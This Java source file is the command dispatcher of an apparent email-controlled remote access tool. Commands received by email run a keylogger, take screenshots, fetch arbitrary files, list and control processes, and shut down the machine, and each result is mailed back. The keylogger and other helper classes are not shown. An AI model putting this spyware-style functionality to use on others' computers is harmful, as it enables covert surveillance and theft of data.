package email;

import javax.mail.MessagingException;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    private static int takeScreenshot(){
        String subject = "res/takeshot" ;
        try {
            SendMail.getInstance().Send(subject, "",ScreenShot.getInstance().takeScreenShot());
            return 1;
        } catch (IOException | MessagingException e) {
            e.printStackTrace();
            return 0;
        }
    }
    private static int keyLog(long timer){

        try {
            String subject = "res/keylog" ;
            SendMail.getInstance().Send(subject,"", KeyLogger.getInstance().startLog(timer));
            return 1;
        } catch (IOException e) {
            System.out.println("Error log");
            e.printStackTrace();
            return 0;
        } catch (MessagingException e) {
            System.out.println("Cannot send mail");
            e.printStackTrace();
            return 0;
        }
    }
    private static int Shutdown( String sudopass){
        try{
            LogoutandShut.getInstance().Logout(sudopass);
            return 1;
        }catch (Exception e){
            try {
                String subject = "res/Shutdown";
                SendMail.getInstance().Send(subject, "Can't Shutdown due to error: " + e.toString(), null);
            }catch (IOException | MessagingException er){
                er.printStackTrace();
            }
            e.printStackTrace();
            return 0;
        }
    }
    private static int ListProcess(){
        String subject = "res/list process";
        try{
            SendMail.getInstance().Send(subject,"", ProcessPC.getInstance().ProcessList());
            return 1;
        }catch(IOException | MessagingException e){
            e.printStackTrace();
            return 0;
        }
    }
    public static int getFile( String path) {
        try {
            Path file = Path.of(path);
            String subject = "res/Get File";
            if (!Files.exists(file)) {
                SendMail.getInstance().Send(subject, "File doesn't exist, try listing the directory!", null);
            } else {
                if (Files.isRegularFile(file)) {
                    SendMail.getInstance().Send(subject, null, path);
                } else {
                    SendMail.getInstance().Send(subject, "You requested a directory type", null);
                }
            }
            return 1;
        } catch (IOException | MessagingException e) {
            System.out.println("can not get file");
            e.printStackTrace();
            return 0;
        }
    }
    private static int listApp(){
        String subject = "res/list App" ;
        String filename = "List App" + ZonedDateTime.now().format(DateTimeFormatter
                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
        try{
            ListApp.getInstance().listFoldersAndExes(filename);
            SendMail.getInstance().Send(subject,"",filename);
            return 1;
        }catch(IOException | MessagingException e){
            e.printStackTrace();
            return 0;
        }
    }
    private static int runApp(String path){
        String subject = "res/Run App";
        try{
            SendMail.getInstance().Send(subject,ListApp.getInstance().runApp(path),null);
            return 1;
        }catch (IOException | MessagingException e){
            e.printStackTrace();
            return 0;
        }
    }
    private static int stopProcess(int PID){
        String subject = "res/Stop Process";
        try{
            SendMail.getInstance().Send(subject,ProcessPC.getInstance().StopProcess(PID),null);
            return 1;
        }catch(IOException | MessagingException e){
            e.printStackTrace();
            return 0;
        }
    }
    private static int startProcess(String Path){
        String subject = "res/Start Process";
        try{
            SendMail.getInstance().Send(subject,ProcessPC.getInstance().StartProcess(Path),null);
            return 1;
        }catch(IOException | MessagingException e){
            e.printStackTrace();
            return 0;
        }
    }
    private static int listDir(){
        String subject = "res/List Directory" ;
        String filename = "List Directory" + ZonedDateTime.now().format(DateTimeFormatter
                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
        try{
            ListDir.getInstance().listAll("C:",filename);
            SendMail.getInstance().Send(subject,"",filename);
            return 1;
        }catch(IOException | MessagingException e){
            e.printStackTrace();
            return 0;
        }
    }
    private static int Restart(String Password){
        try{
            LogoutandShut.getInstance().Logout(Password);
            return 1;
        }catch (Exception e){
            String subject = "res/Restart";
            try {
                SendMail.getInstance().Send(subject, "Can't Shutdown due to error: " + e.toString(), null);
            }catch (IOException | MessagingException er){
                er.printStackTrace();
            }
            e.printStackTrace();
            return 0;
        }
    }
    public static int processRequest(String header) throws ArrayIndexOutOfBoundsException{
        String[] parts = header.split("/");
        System.out.println(Arrays.toString(parts));
        String command = parts[0].trim();

        if (command.equalsIgnoreCase("getfile")) {
            if (parts.length > 1)
                return getFile(parts[1].trim());
        }
        if (command.equalsIgnoreCase("keylog")) {
            long timer = Long.parseLong(parts[1].trim());
            return keyLog(timer);
        }
        else if (command.equalsIgnoreCase("listapp")) {
            return listApp();
        }
        else if (command.equalsIgnoreCase("listdir")) {
            return listDir();
        }
        else if (command.equalsIgnoreCase("shutdown")){
            if (parts.length > 1)
                return Shutdown(parts[1].trim());
            return Shutdown("");
        }else if(command.equalsIgnoreCase("logout")){
            return 2;
        }
        else if (command.equalsIgnoreCase("listprocess")) {
            return ListProcess();
        }
        else if (command.equalsIgnoreCase("takeshot")) {
            return takeScreenshot();
        }
        else if (command.equalsIgnoreCase("stopprocess")) {
            int PID;
            PID = Integer.parseInt(parts[1].trim());
            return stopProcess(PID);
        }
        else if (command.equalsIgnoreCase("startprocess")) {
            if (parts.length > 1){
                String Path = parts[1].trim();
                return startProcess(Path);
            }
        }
        else if (command.equalsIgnoreCase("restart")) {
            if (parts.length > 1)
                return Restart(parts[1].trim());
            return Restart("");
        }
        else if (command.equalsIgnoreCase("runapp")) {
            if(parts.length > 1)
                return runApp((parts[1].trim()));
        }
        return 0;
    }
    public static void main(String[] args) {
    }

}
